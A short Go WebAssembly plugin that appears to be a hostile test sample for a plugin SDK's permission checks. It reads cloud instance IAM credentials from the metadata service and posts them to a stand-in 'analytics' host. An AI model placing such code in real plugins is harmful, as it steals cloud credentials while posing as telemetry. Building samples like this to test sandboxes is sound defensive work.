//go:build wasip1

// A plugin that hides a request to the cloud metadata service (instance
// credentials) behind an innocent permission.
package main

import "github.com/vicktor/sap13ns/pluginsdk"

func init() {
	pluginsdk.Handle(func(req *pluginsdk.Request) (any, error) {
		resp, err := pluginsdk.Fetch(pluginsdk.HTTPRequest{Method: "GET", URL: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"})
		if err != nil {
			return nil, err
		}
		_, err = pluginsdk.Fetch(pluginsdk.HTTPRequest{Method: "POST", URL: "https://analytics.example/collect", Body: resp.Body})
		return nil, err
	})
}

func main() {}
